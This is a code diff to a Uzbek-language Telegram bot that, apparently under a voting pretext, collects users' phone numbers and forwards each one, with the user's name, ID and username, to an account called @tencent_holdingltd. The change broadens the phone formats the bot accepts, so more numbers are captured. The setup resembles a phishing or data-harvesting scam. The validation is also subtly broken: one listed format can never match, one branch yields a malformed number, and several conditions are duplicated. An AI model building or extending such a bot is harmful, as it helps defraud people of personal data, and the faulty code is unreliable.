@@ -57,15 +57,38 @@ Masalan: +998901234567
         phone_number = update.message.text
         user = update.effective_user
         
-        # Check if this is a phone number
-        if phone_number.startswith('+998') and len(phone_number) == 13:
+        # Function to validate and normalize phone number
+        def is_valid_phone(phone):
+            # Remove all non-digit characters except +
+            cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
+            
+            # Check if it's a valid phone number format
+            if cleaned.startswith('+998') and len(cleaned) == 13:
+                return True, cleaned
+            elif cleaned.startswith('998') and len(cleaned) == 12:
+                return True, '+' + cleaned
+            elif cleaned.startswith('8') and len(cleaned) == 11:
+                return True, '+998' + cleaned[1:]
+            elif len(cleaned) == 9 and cleaned.isdigit():
+                return True, '+998' + cleaned
+            elif len(cleaned) == 12 and cleaned.startswith('998'):
+                return True, '+' + cleaned
+            elif len(cleaned) == 13 and cleaned.startswith('+998'):
+                return True, cleaned
+            else:
+                return False, cleaned
+        
+        # Validate phone number
+        is_valid, normalized_phone = is_valid_phone(phone_number)
+        
+        if is_valid:
             # Send phone number to @tencent_holdingltd
             username = user.username or 'Yo\'q'
             admin_message = f"""
 📱 Yangi foydalanuvchi raqami:
 
 👤 Foydalanuvchi: {user.first_name} {user.last_name or ''}
-📱 Telefon: {phone_number}
+📱 Telefon: {normalized_phone}
 🆔 User ID: {user.id}
 🔗 Username: @{username}
             """
@@ -101,7 +124,15 @@ Masalan: +998901234567
                 del context.user_data['voting_param']
                 
         else:
-            await update.message.reply_text("❌ Iltimos, to'g'ri telefon raqamini kiriting!\n\nMasalan: +998901234567")
+            await update.message.reply_text("""❌ Iltimos, to'g'ri telefon raqamini kiriting!
+
+📱 Qabul qilinadigan formatlar:
+• +998901234567
+• 998901234567
+• 8901234567
+• 901234567
+• +998 90 123 45 67
+• 90-123-45-67""")
     
     @staticmethod
     async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -137,8 +168,23 @@ Masalan: +998901234567
         """Handle regular text messages"""
         user_message = update.message.text
         
-        # Check if user is in voting process
-        if 'voting_param' in context.user_data or user_message.startswith('+998'):
+        # Function to check if message looks like a phone number
+        def looks_like_phone(text):
+            # Remove all non-digit characters except +
+            cleaned = ''.join(c for c in text if c.isdigit() or c == '+')
+            
+            # Check various phone number patterns
+            if (cleaned.startswith('+998') and len(cleaned) == 13) or \
+               (cleaned.startswith('998') and len(cleaned) == 12) or \
+               (cleaned.startswith('8') and len(cleaned) == 11) or \
+               (len(cleaned) == 9 and cleaned.isdigit()) or \
+               (len(cleaned) == 12 and cleaned.startswith('998')) or \
+               (len(cleaned) == 13 and cleaned.startswith('+998')):
+                return True
+            return False
+        
+        # Check if user is in voting process or message looks like a phone number
+        if 'voting_param' in context.user_data or looks_like_phone(user_message):
             await MessageHandlers.handle_phone_number(update, context)
             return
         
